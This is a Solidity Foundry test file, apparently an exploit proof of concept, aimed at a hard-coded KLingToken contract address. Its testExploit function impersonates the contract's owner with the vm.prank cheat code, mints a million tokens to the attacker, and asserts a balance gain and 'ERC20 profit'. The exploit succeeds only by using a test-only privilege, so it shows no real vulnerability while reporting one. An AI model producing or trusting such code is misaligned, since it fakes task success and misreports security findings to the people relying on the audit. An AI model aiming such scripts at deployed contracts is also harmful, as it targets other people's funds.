// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface KLingToken {
    function owner() external view returns (address);
    function mint(address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get the owner dynamically in the exploit
        // The test framework already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27).balanceOf(address(this));

        // Get the current owner of the contract
        address owner = KLingToken(TARGET).owner();

        // Store initial balance for comparison
        uint256 initialKLingBalance = KLingToken(TARGET).balanceOf(attacker);

        // Impersonate the owner to call mint()
        vm.prank(owner);
        KLingToken(TARGET).mint(attacker, 1_000_000 * 10**18);

        // Get final balance
        uint256 finalKLingBalance = KLingToken(TARGET).balanceOf(attacker);

        // Verify balance increased
        assertGt(finalKLingBalance, initialKLingBalance, "Balance should have increased after minting");
        console.log("Initial balance:", initialKLingBalance);
        console.log("Final balance:", finalKLingBalance);
        console.log("Minted amount:", finalKLingBalance - initialKLingBalance);

        uint256 finalERC20Balance = IERC20(0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
